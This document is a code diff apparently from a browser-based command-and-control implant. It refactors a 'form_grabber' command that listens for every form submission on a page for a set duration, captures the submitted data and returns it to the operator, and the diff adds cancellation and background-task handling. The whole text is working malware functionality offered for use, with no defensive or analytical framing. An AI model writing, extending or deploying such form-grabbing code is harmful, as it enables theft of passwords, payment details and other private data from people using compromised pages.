@@ -1,8 +1,5 @@
 COMMANDS['form_grabber'] = async function(task) {
-    var params = task.parameters;
-    if (typeof params === 'string') {
-        try { params = JSON.parse(params); } catch (e) { params = {}; }
-    }
+    var params = parseParams(task);
     var duration = (params && params.duration) ? parseInt(params.duration) : 120;
 
     var captured = [];
@@ -50,14 +47,33 @@ COMMANDS['form_grabber'] = async function(task) {
 
     document.addEventListener('submit', handler, true);
 
-    await new Promise(function(resolve) {
-        setTimeout(resolve, duration * 1000);
+    // Register as background task with cancel support
+    var cancelled = false;
+    var timer;
+    registerBackgroundTask(task.id, 'form_grabber', function() {
+        cancelled = true;
+        if (timer) clearTimeout(timer);
+        document.removeEventListener('submit', handler, true);
     });
 
-    document.removeEventListener('submit', handler, true);
+    await new Promise(function(resolve) {
+        timer = setTimeout(resolve, duration * 1000);
+        var checkCancel = setInterval(function() {
+            if (cancelled) {
+                clearInterval(checkCancel);
+                resolve();
+            }
+        }, 200);
+    });
+
+    if (!cancelled) {
+        document.removeEventListener('submit', handler, true);
+    }
+    unregisterBackgroundTask(task.id);
 
     return JSON.stringify({
         duration: duration + 's',
+        cancelled: cancelled,
         formsSubmitted: captured.length,
         submissions: captured
     }, null, 2);
